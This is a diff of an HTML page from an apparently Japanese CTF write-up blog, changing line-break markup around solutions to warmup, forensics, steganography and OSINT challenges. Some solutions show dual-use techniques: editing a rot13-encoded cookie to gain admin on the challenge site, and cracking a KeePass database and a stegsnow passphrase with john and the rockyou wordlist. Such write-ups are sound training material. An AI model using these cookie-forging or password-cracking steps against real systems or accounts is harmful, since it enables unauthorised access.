+<br />
 <h3 id="solution-8">Solution</h3>
 <p>これも、前述したチャレンジと同様です。今度は、classes.dexの中にあります。</p>
 <pre>
@@ -734,7 +730,7 @@ $ find . -name '*' | xargs grep flag 2>/dev/null
 
 $ strings classes.dex | grep flag
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>flag{3asY_4ndr0id_r3vers1ng}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -748,7 +744,7 @@ $ strings classes.dex | grep flag
 <ul>
 <li>microsooft.docx</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-9">Solution</h3>
 <p>これも、前述したチャレンジと同様ですね。</p>
 <pre>
@@ -756,7 +752,7 @@ $ unzip microsooft.docx
 
 $ find . -name '*' | xargs grep flag 2>/dev/null
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>flag{oof_is_right_why_gfxdata_though}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -770,14 +766,14 @@ $ find . -name '*' | xargs grep flag 2>/dev/null
 <ul>
 <li>luke.jpg</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-10">Solution</h3>
 <p>&ldquo;kust&rdquo; は &ldquo;just&rdquo; のタイポだし、&ldquo;ksteg&rdquo; は &ldquo;jsteg&rdquo; のことです。</p>
 <pre>
 $ jsteg reveal luke.jpg 
 flag{yeast_bit_steganography_oops_another_typo}
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>flag{yeast_bit_steganography_oops_another_typo}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -791,18 +787,18 @@ flag{yeast_bit_steganography_oops_another_typo}
 <ul>
 <li>flag.wav</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-11">Solution</h3>
 <p>Windowsで動くFree Softwareの「Software DTMF Controller Version 1.2」を使いました。</p>
 <p>以下の文字列になります。</p>
 <p><code>46327402297754110981468069185383422945309689772058551073955248013949155635325</code></p>
-<p><br />
-以下のオンラインツールでも同じ文字列が取れます。（もしかしたら、サーバダウンしちゃっているかもです。）</p>
+<br />
+以下のオンラインツールでも同じ文字列が取れます。（もしかしたら、サーバダウンしちゃっているかもです。）
 <p><a href="http://dialabc.com/sound/detect/index.html">http://dialabc.com/sound/detect/index.html</a></p>
-<p><br />
-16進数にしてから文字に変換しました。</p>
+<br />
+16進数にしてから文字に変換しました。
 <p><code>666c61677b646f5f796f755f737065616b5f7468655f626565705f626f6f707d</code></p>
-<p><br /></p>
+<br />
 <p>Flag: <code>flag{do_you_speak_the_beep_boop}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -817,11 +813,11 @@ Connect here:
 <br /><br />
 Note, this flag is not in the usual format.</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-12">Solution</h3>
 <p><a href="https://web.archive.org/web/20200418213402/https://apporima.com/flag.txt">https://web.archive.org/web/20200418213402/https://apporima.com/flag.txt</a></p>
-<p><br />
-Flag: <code>JCTF{the_wayback_machine}</code></p>
+<br />
+Flag: `JCTF{the_wayback_machine}`
 <p><br /><br />
 <br /><br /></p>
 <h2 id="osint-new-years-resolution-50-points">[OSINT]: New Years Resolution (50 points)</h2>
@@ -834,12 +830,12 @@ There is nothing running on port 80. This is an OSINT challenge.
 <br /><br />
 Connect here: jh2i.com</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-13">Solution</h3>
 <p>Name resolutionですね。こういうセンスのあるチャレンジ名、いいと思います。</p>
 <p>これは、<a href="https://www.passivetotal.org/">PassiveTotal</a> で見たら簡単にわかりました。SPFレコードを取ればよかったみたいです。</p>
-<p><br />
-digでやるなら、</p>
+<br />
+digでやるなら、
 <pre>
 $ dig jh2i.com -t SPF
 
@@ -857,7 +853,7 @@ $ dig jh2i.com -t SPF
 ;; ANSWER SECTION:
 jh2i.com.		600	IN	SPF	"flag{next_year_i_wont_use_spf}"
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>flag{next_year_i_wont_use_spf}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -867,12 +863,12 @@ jh2i.com.		600	IN	SPF	"flag{next_year_i_wont_use_spf}"
 <blockquote>
 <p>This time we have a username. Can you track down NahamConTron?</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-14">Solution</h3>
 <p>Instagram で &ldquo;NahamConTron&rdquo; をサーチしたら見つかります。</p>
 <p><a href="https://www.instagram.com/nahamcontron/">https://www.instagram.com/nahamcontron/</a></p>
-<p><br />
-Flag: <code>flag{i_feel_like_that_was_too_easy}</code></p>
+<br />
+Flag: `flag{i_feel_like_that_was_too_easy}`
 <p><br /><br />
 <br /><br /></p>
 <h2 id="warmup-clisay-20-points">[Warmup]: CLIsay (20 points)</h2>
@@ -885,7 +881,7 @@ Flag: <code>flag{i_feel_like_that_was_too_easy}</code></p>
 <ul>
 <li>clisay</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-15">Solution</h3>
 <p>stringsで２分割されたフラグが見つかります。</p>
 <pre>
@@ -893,7 +889,7 @@ $ strings clisay | egrep "{|}"
 flag{Y0u_c4n_
 r3Ad_M1nd5}
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>flag{Y0u_c4n_r3Ad_M1nd5}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -907,11 +903,11 @@ r3Ad_M1nd5}
 <ul>
 <li>hackermeme.jpg</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-16">Solution</h3>
 <p>exiftool</p>
-<p><br />
-Flag: <code>flag{N0t_7h3_4cTuaL_Cr3At0r}</code></p>
+<br />
+Flag: `flag{N0t_7h3_4cTuaL_Cr3At0r}`
 <p><br /><br />
 <br /><br /></p>
 <h2 id="warmup-mr-robot-25-points">[Warmup]: Mr. Robot (25 points)</h2>
@@ -923,11 +919,11 @@ Flag: <code>flag{N0t_7h3_4cTuaL_Cr3At0r}</code></p>
 Connect here:
 <a href="http://jh2i.com:50032">http://jh2i.com:50032</a></p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-17">Solution</h3>
 <p><a href="http://jh2i.com:50032/robots.txt">http://jh2i.com:50032/robots.txt</a></p>
-<p><br />
-Flag: <code>flag{welcome_to_robots.txt}</code></p>
+<br />
+Flag: `flag{welcome_to_robots.txt}`
 <p><br /><br />
 <br /><br /></p>
 <h2 id="warmup-uggc-30-points">[Warmup]: UGGC (30 points)</h2>
@@ -939,13 +935,13 @@ Flag: <code>flag{welcome_to_robots.txt}</code></p>
 Connect here:
 <a href="http://jh2i.com:50018">http://jh2i.com:50018</a></p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-18">Solution</h3>
 <p>anonymousでログインすると、<code>user=nabalzbhf</code> というCookieが作られました。</p>
 <p>Cookieの値を <code>user=admin</code> にしたら、<code>You are logged in as nqzva</code> と表示されました。</p>
 <p>rot13 になるようなので、<code>user=nqzva</code> にしたらadminになれます。</p>
-<p><br />
-Flag: <code>flag{H4cK_aLL_7H3_C0okI3s}</code></p>
+<br />
+Flag: `flag{H4cK_aLL_7H3_C0okI3s}`
 <p><br /><br />
 <br /><br /></p>
 <h2 id="warmup-easy-keesy-30-points">[Warmup]: Easy Keesy (30 points)</h2>
@@ -963,7 +959,7 @@ Flag: <code>flag{H4cK_aLL_7H3_C0okI3s}</code></p>
 $ file easy_keesy 
 easy_keesy: Keepass password database 2.x KDBX
 </pre>
-<p><br /></p>
+<br />
 <h3 id="solution-19">Solution</h3>
 <pre>
 $ keepass2john easy_keesy > easy_keesy.hash
@@ -979,10 +975,10 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 monkeys          (easy_keesy)
 
 </pre>
-<p><br />
-WindowsのKeePassを使って、<code>monkeys</code>を使ってデータベースを開くとフラグが見つかります。</p>
-<p><br />
-Flag: <code>flag{jtr_found_the_keys_to_kingdom}</code></p>
+<br />
+WindowsのKeePassを使って、`monkeys`を使ってデータベースを開くとフラグが見つかります。
+<br />
+Flag: `flag{jtr_found_the_keys_to_kingdom}`
 <p><br /><br />
 <br /><br /></p>
 <h2 id="warmup-pang-40-points">[Warmup]: Pang (40 points)</h2>
@@ -1000,12 +996,12 @@ Flag: <code>flag{jtr_found_the_keys_to_kingdom}</code></p>
 $ file pang
 pang: PNG image data, 1567 x 70, 8-bit grayscale, non-interlaced
 </pre>
-<p><br /></p>
+<br />
 <h3 id="solution-20">Solution</h3>
 <p>PNG imageなので、拡張子に .png を付けました。</p>
 <p>確かに Kali 上だと開けなかったんですが、WindowsのPhoto viewerとかで普通に開けたんですよね。</p>
-<p><br />
-Flag: <code>flag{wham_bam_thank_you_for_the_flag_maam}</code></p>
+<br />
+Flag: `flag{wham_bam_thank_you_for_the_flag_maam}`
 <p><br /><br />
 <br /><br />
 <img src="https://captureamerica.github.io/writeups/img/orange_bar.png" alt="orange_bar.png">
@@ -1024,11 +1020,11 @@ Note, this flag is not in the usual format.</p>
 <ul>
 <li>doh.jpg</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-21">Solution</h3>
 <p>「青い空を見上げればいつもそこに白い猫」で開くと 「Steghideの可能性あり」とのことで、steghideを使ってはみたもののpassphraseが見当つかずに諦めたやつです。</p>
-<p><br />
-passphrase無しで試すという発想がなかった。。。</p>
+<br />
+passphrase無しで試すという発想がなかった。。。
 <pre>
 $ steghide extract -sf doh.jpg 
 Enter passphrase: 
@@ -1037,7 +1033,7 @@ wrote extracted data to "flag.txt".
 $ cat flag.txt
 JCTF{an_annoyed_grunt}
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>JCTF{an_annoyed_grunt}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -1053,15 +1049,15 @@ Note, this flag is not in the usual format.</p>
 <ul>
 <li>frostythesnowman.txt</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-22">Solution</h3>
 <p>チャレンジタイトルと、添付ファイルより、stegsnowは確定だったんですが、これまたpassphraseが見当つかずに諦めたやつです。</p>
 <blockquote>
 <p>Frosty the Snowman is just made up of a lot of snowflakes. Which is the right one?</p>
 </blockquote>
 <p>と言っているので、snowflakesの名前の内のひとつがpassphraseなのかと思ってネットでsnowflakesの名前を探していろいろ試したけどダメでした。</p>
-<p><br />
-rockyou.txtを使って総当りするという発想は無かった。。。（というか、正直のところ、このチャレンジ文はどうかと思います）</p>
+<br />
+rockyou.txtを使って総当りするという発想は無かった。。。（というか、正直のところ、このチャレンジ文はどうかと思います）
 <pre>
 $ cat snowflake_solve.sh
 while read line
@@ -1075,7 +1071,7 @@ you: No such file or directory
 JCTF{gemmy_spinning_snowflake}
 ^C
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>JCTF{gemmy_spinning_snowflake}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -1092,7 +1088,7 @@ Note, this flag is not in the usual format.</p>
 <li>hackers.bmp</li>
 </ul>
 <img src="https://captureamerica.github.io/writeups/img/hackers.bmp" alt="hackers.bmp">
-<p><br /></p>
+<br />
 <h3 id="solution-23">Solution</h3>
 <p>画像系はいつもzstegをかけることを心がけているんですが、-aオプションはいつも付けてなかったです。</p>
 <p>こんな感じ。</p>
@@ -1101,16 +1097,16 @@ $ zsteg hackers.bmp
 imagedata           .. text: "348>?CFGKIJNRSWJKOcbdcbdUTVdceGFHCBD"
 [=] nothing :(                    
 </pre>
-<p><br />
--aオプションを付けて実行してたら、フラグが取れたようです。</p>
+<br />
+-aオプションを付けて実行してたら、フラグが取れたようです。
 <pre>
 $ zsteg -a hackers.bmp | grep -i "{.*}"
 b1,bgr,lsb,xy       .. text: "4JCTF{at_least_the_movie_is_older_than_this_software}"
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>4JCTF{at_least_the_movie_is_older_than_this_software}</code></p>
-<p><br />
-ちなみに、Hackers (邦題：サイバーネット) のDVD持ってます。アンジェリーナ ジョリーがかわいいんですよね。</p>
+<br />
+ちなみに、Hackers (邦題：サイバーネット) のDVD持ってます。アンジェリーナ ジョリーがかわいいんですよね。
 <p><br /><br />
 <br /><br /></p>
 <hr>
@@ -1166,7 +1162,7 @@ b1,bgr,lsb,xy       .. text: "4JCTF{at_least_the_movie_is_older_than_this_softwa
     <footer id="footer" class="footer">
       <div class="social-links">
       <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
-  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+  
 </div>
 
 <div class="copyright">
@@ -1201,20 +1197,21 @@ b1,bgr,lsb,xy       .. text: "4JCTF{at_least_the_movie_is_older_than_this_softwa
 
 
 
-<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>
 
 
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
 	ga('create', 'UA-104910699-2', 'auto');
 	ga('set', 'anonymizeIp', true);
 	ga('send', 'pageview');
 }
 </script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
 
 
 
